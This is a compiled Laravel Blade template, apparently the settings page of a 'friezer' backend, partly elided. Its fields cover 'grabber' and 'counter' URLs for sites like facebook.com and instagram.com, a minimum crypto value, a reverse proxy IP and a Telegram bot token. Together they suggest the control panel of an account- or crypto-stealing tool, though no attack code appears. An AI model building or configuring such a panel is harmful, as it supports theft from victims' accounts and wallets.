            ...
            <div class="row">
                <div class="col-xl">
                    <div class="card mb-4">
                        ...
                        <div class="card-body">
                            <form action="<?php echo e(route('settings.save')); ?>" method="POST">
                                <div class="mb-3">
                                    <?php
                                    ...
                                    <input type="text" name="grabber_urls" placeholder="facebook.com,instagram.com" value="<?php echo e($urls); ?>" class="form-control">
                                ...
                                <div class="mb-3">
                                    ...
                                    <input type="text" name="counter_urls" placeholder="facebook.com,instagram.com" value="<?php echo e($urls); ?>" class="form-control">
                                ...
                                <div class="mb-3">
                                    ...
                                    <input type="text" name="offline_timeout" placeholder="5" value="<?php echo e(\App\Models\Setting::getValue('offline_timeout')); ?>" class="form-control">
                                ...
                                <div class="mb-3">
                                    ...
                                    <input type="text" placeholder="1" name="crypto_min_usd" value="<?php echo e(\App\Models\Setting::getValue('crypto_min_usd')); ?>" class="form-control">
                                ...
                                <div class="mb-3">
                                    ...
                                    <select id="cmd" class="select2 form-select" name="delete_address">
                                        <option <?php if($deleteAddress === true): ?> selected <?php endif; ?> value="1">Yes</option>
                                        <option <?php if($deleteAddress === false): ?> selected <?php endif; ?> value="0">No</option>
                                    </select>
                                ...
                                <div class="mb-3">
                                    ...
                                    <input type="text" placeholder="xxx.xxx.xxx.xxx" name="reverse_proxy_ip" value="<?php echo e(\App\Models\Setting::getValue('reverse_proxy_ip')); ?>" class="form-control">
                                </div>

                                <div class="mb-3">
                                    <label class="form-label" for="tg_token">Telegram Bot Token</label>
                                    <input type="text" name="tg_token" placeholder="" value="<?php echo e(\App\Models\Setting::getValue('tg_token')); ?>" class="form-control">
                                ...
                                <div class="mb-3">
                                    ...
                                    <input type="text" name="tg_id" placeholder="" value="<?php echo e(\App\Models\Setting::getValue('tg_id')); ?>" class="form-control">
...
<?php echo $__env->make('pages.layout', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH C:\OSPanel\domains\friezer-backend\resources\views/pages/settings/index.blade.php ENDPATH**/ ?>